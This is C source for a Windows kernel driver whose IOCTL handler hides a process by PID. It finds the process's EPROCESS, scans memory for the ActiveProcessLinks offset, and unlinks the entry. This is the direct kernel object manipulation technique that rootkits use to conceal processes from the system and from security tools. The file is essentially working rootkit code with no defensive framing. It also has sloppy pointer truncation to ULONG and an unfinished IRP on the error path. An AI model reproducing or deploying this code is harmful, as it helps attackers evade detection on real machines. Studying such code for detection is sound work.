#include "Header.h"

NTSTATUS DefaultDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);

	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = STATUS_SUCCESS;

	IofCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS IoctlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	PVOID Buffer;
	HANDLE Pid;
	PEPROCESS Eprocess;
	PLIST_ENTRY ActiveProcessLink;
	ULONG Offset = 0;
	INT_PTR ListOffset;
	PIO_STACK_LOCATION ioIrp;
	ULONG ioCode;
	NTSTATUS Status;

	pIrp->IoStatus.Status = STATUS_SUCCESS;
	ioIrp = IoGetCurrentIrpStackLocation(pIrp);
	Buffer = pIrp->AssociatedIrp.SystemBuffer;
	Pid = *(PHANDLE*)Buffer;
	
	ioCode = ioIrp->Parameters.DeviceIoControl.IoControlCode;
	switch (ioCode)
	{
	default:
		DbgPrint("[-] Invalid IoControl Code\n");
		return STATUS_UNSUCCESSFUL;
		break;

	case IOCTL_TEST_CMD: {
		Status = PsLookupProcessByProcessId(Pid, &Eprocess);
		if (!NT_SUCCESS(Status)) {
			DbgPrint("Failed to get Eprocess of given PID\n");
			break;
		}

		DbgPrint("[+] Eprocess is at address : %#x\n", (ULONG)Eprocess);

		for (ULONG i = 0x20; i < 0x300; i += 4) {
			if ((*(ULONG*)((UCHAR*)Eprocess + i) == (ULONG)Pid))
				Offset = i;
		}

		DbgPrint("[+] ActiveProcessLink is at offset : %#x\n", Offset);
		ListOffset = Offset + sizeof(INT_PTR);
		DbgPrint("[+] ListOffset : %#x\n", ListOffset);
		
	    ActiveProcessLink = (PLIST_ENTRY)((ULONG)ListOffset + (ULONG)Eprocess);
		DbgPrint("[+] ActiveProcessLink is at address : %#x\n", (ULONG)ActiveProcessLink);

		if (!NT_SUCCESS(RemoveEntry((PLIST_ENTRY)ActiveProcessLink))) {
			DbgPrint("[-] Failed to Hide Process\n");
			break;
		}

		DbgPrint("[+] Successfully hidden process with PID : %#x\n", (ULONG)Pid);

		ObDereferenceObject(Eprocess);

		break;
	}
	}

	return STATUS_SUCCESS;
}